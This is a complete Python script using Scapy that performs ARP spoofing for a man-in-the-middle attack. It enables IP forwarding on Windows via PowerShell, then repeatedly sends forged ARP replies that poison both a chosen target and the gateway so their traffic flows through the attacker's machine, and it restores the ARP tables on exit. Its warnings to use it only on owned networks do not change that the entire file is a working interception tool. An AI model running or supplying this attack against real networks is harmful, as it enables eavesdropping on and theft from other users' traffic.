import os
import sys
import time
import argparse
import logging
try:
    from scapy.all import sniff, ARP, Ether, srp, send
except ImportError:
    print("Scapy not found. Please install it: pip install scapy")
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("arp_spoofer")

def enable_ip_routing():
    log.info("Attempting to enable IP Routing on Windows...")
    # This enables IP forwarding temporarily. For permanent, use registry.
    os.system('powershell -Command "Set-NetIPInterface -Forwarding Enabled"')
    log.info("IP Routing should be enabled. If victims lose internet, you must enable the 'Routing and Remote Access' service.")

def get_mac(ip):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].src
    return None

def spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return False
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(packet, verbose=False)
    return True

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="WhoApp ARP Spoofer (Man-in-the-Middle)")
    parser.add_argument("target", help="Target IP to sniff (e.g. 30.0.2.100). Use 'all' for entire subnet (dangerous!).")
    parser.add_argument("gateway", help="Gateway/Router IP (e.g. 30.0.0.1)")
    args = parser.parse_args()

    log.warning("!!! WARNING: ARP SPOOFING CAN DISRUPT NETWORK TRAFFIC !!!")
    log.warning("Only use this on networks you own. Ensure IP Routing is enabled.")
    
    enable_ip_routing()

    target_ip = args.target
    gateway_ip = args.gateway

    # If target is 'all', we would need to scan the subnet. 
    # For safety and simplicity, we recommend targeting specific IPs.
    if target_ip.lower() == "all":
        log.error("Spoofing 'all' is highly unstable on Wi-Fi. Please specify a single Target IP.")
        sys.exit(1)

    log.info(f"Resolving MAC addresses for {target_ip} and {gateway_ip}...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac:
        log.error(f"Could not find MAC address for Target {target_ip}. Is it online?")
        sys.exit(1)
    if not gateway_mac:
        log.error(f"Could not find MAC address for Gateway {gateway_ip}.")
        sys.exit(1)

    log.info(f"Target MAC: {target_mac}")
    log.info(f"Gateway MAC: {gateway_mac}")
    log.info(f"Starting ARP Spoof. Press Ctrl+C to stop and restore network.")

    try:
        sent_packets_count = 0
        while True:
            # Tell target that WE are the gateway
            spoof(target_ip, gateway_ip)
            # Tell gateway that WE are the target
            spoof(gateway_ip, target_ip)
            
            sent_packets_count += 2
            print(f"\r[+] Sent {sent_packets_count} ARP packets...", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C pressed. Restoring network connection... Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        log.info("Network restored. Exiting.")

if __name__ == "__main__":
    main()
